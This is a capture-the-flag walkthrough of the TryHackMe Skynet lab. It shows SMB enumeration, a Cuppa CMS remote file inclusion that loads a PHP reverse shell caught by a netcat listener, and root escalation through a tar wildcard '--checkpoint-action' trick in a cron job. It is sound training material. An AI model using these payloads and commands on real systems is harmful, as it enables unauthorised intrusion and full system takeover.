## Overview:
Machine takes us through enumerating SMB, directory traversal, exploiting RFI and Privilege Escalation.

## Enumeration:
Starting with the nmap scan
```sh
nmap -sV -p- -v -oN nmap.initial 10.10.10.10
```
<br>
![Image]({{ "/assets/images/thm/skynet/nmapinitial.png" | relative_url}})
<br>
Let's go on and look through available SMB shares.
```sh
smbclient -L //10.10.10.10/
```
<br>
![Image]({{ "/assets/images/thm/skynet/smbshares.png" | relative_url}})
<br>
There are two interesting shares, **anonymous** and **milesdyson**. After accessing **anonymous** share, you will get two files *attention.txt* and *log1.txt*. Accessing **milesdyson** share needs password which we don't have as of now.
<br>

<br>
Reading through the files we get a message and a list of strings which look like passwords for something.
<br>
![Image]({{ "/assets/images/thm/skynet/attentionlog.png" | relative_url}})
<br>
Now, let's take a look at the webpage. On the index page there is a input box which leads us to nothing. Fireup **Gobuster** and search for directories.  
```sh
gobuster dir -u http://10.10.10.10/ --w /usr/share/wordlists/dirb/common.txt -t 20
```
<br>
![Image]({{ "/assets/images/thm/skynet/squirreldir.png" | relative_url}})
<br>
Access the directory in the browser. We get a login page. We might have the credentials for this. User may be **milesdyson** and we have a list of possible passwords. Fortunately, first string from the log file is the password.<br>
*username: milesdyson*<br>
*password: cyborg007haloterminator* <br>
We get to the inbox and there are some emails received by milesdyson. Opening the first one, we get his SMB password.
<br>
![Image]({{ "/assets/images/thm/skynet/smbpass.png" | relative_url}})
<br>
Access the share with the password found.
```sh
smbclient //10.10.10.10/milesdyson -U milesdyson
```
<br>
![Image]({{ "/assets/images/thm/skynet/milessmb.png" | relative_url}})
<br>
You will get a file called **important.txt** in the directory **notes**. Download it and you will get the hidden directory inside it.
<br>
![Image]({{ "/assets/images/thm/skynet/hiddendir.png" | relative_url}})
<br>
At this directory you will see Miles Dyson's Personal Page. Fireup the gobuster again against the newly found hidden directory as the base-url. You will find another directory which will lead you to Cuppa CMS.
<br>

<br>
I tried the same credentials that we used previously but they didn't work. After using searchsploit for cuppa, you will come to know that Cuppa CMS is vulnerable to LFI & RFI.
<br>

<br>
[Access the exploit here](https://www.exploit-db.com/exploits/25971) and read through it to know how to exploit it.
<br>

## Gaining Foothold:
We will use the famous php_reverse_shell to exploit RFI. If you are using Kali or Parrot, you will get the shell at /usr/share/webshells/php/php-reverse-shell.php. Copy this shell to your current directory and change the IP address in the script to your TryHackMe IP. After that you have to start the webserver using python in the same directory. 
```sh
python -m SimpleHTTPServer 80
```
Start the Netcat listener on port you specified inside the php script.
```sh
nc -nvlp 1234
```
Use the following url to exploit the vulnerability
```url
http://10.10.10.10/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://127.0.0.1/shell.php?
```
<center><h3>Before RFI</h3></center>

<br>
<center><h3>After RFI</h3></center>
<br>
![Image]({{ "/assets/images/thm/skynet/RFIRevShell.png" | relative_url}})
<br>    
Get the User Flag in **milesdyson's** home directory.

## Privilege Escalation:
Enumerating through the directories, you will get a **backup.sh**.
<br>
![Image]({{ "/assets/images/thm/skynet/backup.png" | relative_url}})
<br>
First thing I checked after looking at this script is cron jobs.
```sh
cat /etc/crontab
```
The script is running every minute as root. So, this is what we will use to PrivEsc.
<br>
It's running **tar** command to backup all the contents of **/var/www/html** directory. Its using wildcard. We will take the advantage of this wildcard.
[Look at this article to know how to PrivEsc using tar and wildcard](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)
<br>
You need to create a script that you want to run as root inside the **/var/www/html** directory. Following is the one I created.
```sh
touch run.sh
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" > run.sh
```
Then we need to create checkpoints so that our malicious script is run by the backup.sh script.
```sh
echo "" > "--checkpoint-action=exec=sh run.sh"
echo "" > --checkpoint=1
```
![Image]({{ "/assets/images/thm/skynet/checkpoint.png" | relative_url}})
<br>
Now wait for the script to run and then you will have a SUID binary of bash inside temp directory.
<br>
![Image]({{ "/assets/images/thm/skynet/suidbash.png" | relative_url}})
<br>
```sh
./bash -p
```
![Image]({{ "/assets/images/thm/skynet/privescflag.png" | relative_url}})
<br>
Get the root flag.

That's it for this machine. See you later!
